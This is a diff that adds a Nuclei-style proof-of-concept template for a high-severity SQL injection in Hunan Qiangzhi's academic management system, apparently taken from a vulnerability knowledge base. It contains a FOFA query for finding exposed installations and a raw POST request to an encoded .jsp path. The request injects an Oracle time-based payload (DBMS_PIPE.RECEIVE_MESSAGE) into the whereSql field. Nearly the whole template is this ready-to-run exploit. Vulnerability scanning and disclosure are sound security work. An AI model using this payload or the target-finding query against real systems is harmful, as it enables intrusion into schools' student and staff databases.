@@ -1,0 +1,36 @@
+id: poc-ce9i6veuqk0surrk
+info:
+  name: 湖南强智教务管理系统sjxx存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ce9i6veuqk0surrk'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ce9i6veuqk0surrk
+    fofa: body="湖南强智科技发展有限公司" || body="verifycode.servlet" || body="/findmm.jsp"
+http:
+- raw:
+  - 'POST /jiaowu/stkxt/sjxx/sjxx_sp_list.js%70 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept: */*
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Content-Length: 84
+
+
+    whereSql= AND 6371=DBMS_PIPE.RECEIVE_MESSAGE(CHR(107)||CHR(66)||CHR(105)||CHR(89),8)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
